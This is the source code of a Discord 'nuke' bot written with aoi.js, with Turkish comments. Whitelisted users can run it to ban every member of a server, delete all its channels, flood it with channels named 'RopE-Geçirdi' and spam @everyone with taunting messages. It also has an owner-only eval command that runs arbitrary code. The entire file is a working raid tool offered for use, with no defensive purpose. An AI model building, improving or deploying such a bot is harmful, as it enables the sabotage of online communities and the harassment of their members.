const voltree = require("aoi.js")
var fs = require('fs')
const bot = new voltree.Bot({
    token: process.env.token,
    prefix:"$getServerVar[prefix]"
})
bot.onJoined()
bot.onLeave()
bot.onMessage()


bot.variables({
whitelist:"700733357973176360", //whitelist'e kişi eklemek için ID'ler arasına ; koyun. (Örnek: whitelist:"700733357973176360;920315243106795570;890626326350946364")
prefix:"."
})


//BAN\\
bot.command({
  name:"ban",
  code:`
  $forEachMember[ban]
  $sendDM[$authorID;Üyeler banlanmaya başlandı...]
  $onlyForIDs[$getVar[whitelist];]
  `
  })
bot.awaitedCommand({
  name:"ban",
  code:`
  $ban[$authorID;Kolaydınız xd (Voltree)]
  $onlyIf[$checkContains[$toLowercase[$authorID];$getVar[whitelist]]==false;]
  $suppressErrors
  `
  })


//KANAL SİL\\
bot.command({
  name:"ksil",
  code:`
    $forEachGuildChannel[kanalsil]
    $sendDM[$authorID;Kanallar silinmeye başlandı...]
    $onlyForIDs[$getVar[whitelist];]
  `
})
  bot.awaitedCommand({
    name:"kanalsil",
    code:`
      $deleteChannels[$channelID]
  `
})

//KANAL KUR\\
bot.command({ 
  name: "kkur", 
  code: ` $forEachGuildChannel[kanalkur] `});

bot.awaitedCommand({ 
   name: "kanalkur", 
   code: ` $createChannel[RopE-Geçirdi;text;no;] `
});
  bot.channelCreateCommand({
    channel:"RopE",
    code:`
    $channelSendMessage[$newChannel[id];@everyone **Kolaydınız xd :rofl::wink:**]
    `
      })
bot.onChannelCreate()


//SPAM\\
bot.command({
  name:"spam",
  code:`
  $djsEval[for(var i = 0;i < 100;i++){
message.channel.send("@everyone **Kolaydınız xd :rofl::wink:**")
  }]
  $onlyForIDs[$getVar[whitelist];]
  `
})

bot.command({
  name:'eval',
  code:`
  $eval[$message]
  $onlyForIDs[$botOwnerID;]
  `
})